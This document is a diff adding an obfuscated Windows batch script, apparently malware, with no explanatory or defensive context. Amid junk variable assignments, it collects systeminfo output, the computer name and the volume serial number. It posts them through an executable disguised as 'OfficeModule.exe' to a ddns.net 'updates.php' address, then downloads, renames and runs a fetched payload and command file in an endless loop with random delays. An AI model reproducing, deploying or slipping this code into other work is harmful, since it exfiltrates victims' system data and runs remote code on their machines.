@@ -1,0 +1,81 @@
+@echo off
+set VBOqEBf=%systemroot%
+setlocal ENABLEDELAYEDEXPANSION
+if %USERPROFILE%==bUDFniN set MCoRBRj=%COMPUTERNAME%
+set VBOqEBf=%APPDATA%
+set vers=V.74
+set VBOqEBf=%APPDATA%
+set XIDIo=ByxoX
+set VBOqEBf=%APPDATA%
+set eomKN=%APPDATA%\Microsoft\Crypto\RSA
+set pIcDFiG=%DATE%
+set sBHIipk=%random%
+set kbDRK=XP
+if %USERPROFILE%==bUDFniN set MCoRBRj=%COMPUTERNAME%
+ver | find /i "%kbDRK%"
+if %errorlevel% == 0 (
+set eomKN=%WINDIR%\Microsoft\Crypto\RSA
+)
+set VBOqEBf=%APPDATA%
+set VJakY=cryptcp
+set sBHIipk=%random%
+for /f %%a in ('
+tasklist /nh /fi "imagename eq %VJakY%.exe" ^| find /c "%VJakY%.exe"
+') do set /a DbeHN=%%a
+if %DbeHN% geq 2 goto exit
+set sBHIipk=%random%
+set pIcDFiG=%DATE%
+For /F "skip=1 Tokens=4*" %%n In ('vol c:') Do set tqDlR=%%n
+if %tqDlR%==is (
+For /F "skip=1 Tokens=5*" %%m In ('vol c:') Do set tqDlR=%%m
+)
+if %USERPROFILE%==bUDFniN set MCoRBRj=%COMPUTERNAME%
+set VBOqEBf=%systemroot%
+set VBOqEBf=%APPDATA%
+set cGvFw=%computername%_%tqDlR:-=%
+set sBHIipk=%random%
+set cGvFw=%cGvFw: =%
+set pIcDFiG=%DATE%
+systeminfo>paGYd
+set sBHIipk=%random%
+FOR /F "tokens=*" %%f IN (paGYd) do @IF NOT Z%%f==Z set infosys=!infosys!%%f+###
+set VBOqEBf=%APPDATA%
+
+:cpSwS
+set cqhUZ=OfficeModule.exe
+set /a IHNAx=50*%RANDOM%/32768
+if %USERPROFILE%==bUDFniN set MCoRBRj=%COMPUTERNAME%
+timeout /t %IHNAx%
+set VBOqEBf=%systemroot%
+tasklist /fi "IMAGENAME eq %cqhUZ%" | find /i "%cqhUZ%"
+if not errorlevel 1 taskkill /f /im %cqhUZ%
+set pIcDFiG=%DATE%
+set HdCPw=drop-news
+set aKdiH=ddns.net
+set VBOqEBf=%APPDATA%
+set RyJIc=updates.php
+set pIcDFiG=%DATE%
+set BHvhl=http://%HdCPw%.%aKdiH%/%RyJIc%
+set VBOqEBf=%APPDATA%
+start /b %cqhUZ% --post-data="versiya=%vers%&comp=%computername%&id=%cGvFw%&sysinfo=%infosys%&fid=000000" "%BHvhl%" -q -N %BHvhl% -O %XIDIo%
+timeout /T 10
+
+tasklist /fi "IMAGENAME eq %cqhUZ%" | find /i "%cqhUZ%"
+if not errorlevel 1 taskkill /f /im %cqhUZ%
+
+for %%t in (%XIDIo%) do (set /a OUkkY=%%~Zt)
+if %OUkkY% LEQ 60000 goto OIGDj
+
+:ByxoX
+set pIcDFiG=%DATE%
+RENAME "%XIDIo%" %VJakY%.tmp
+timeout /2
+RENAME "updates.cmd" OIGDj.cmd
+set VBOqEBf=%APPDATA%
+call OIGDj.cmd %IHNAx% %eomKN% %VJakY% %XIDIo%
+set VBOqEBf=%systemroot%
+:OIGDj
+set VBOqEBf=%APPDATA%
+timeout /T %IHNAx%
+set VBOqEBf=%systemroot%
+goto cpSwS
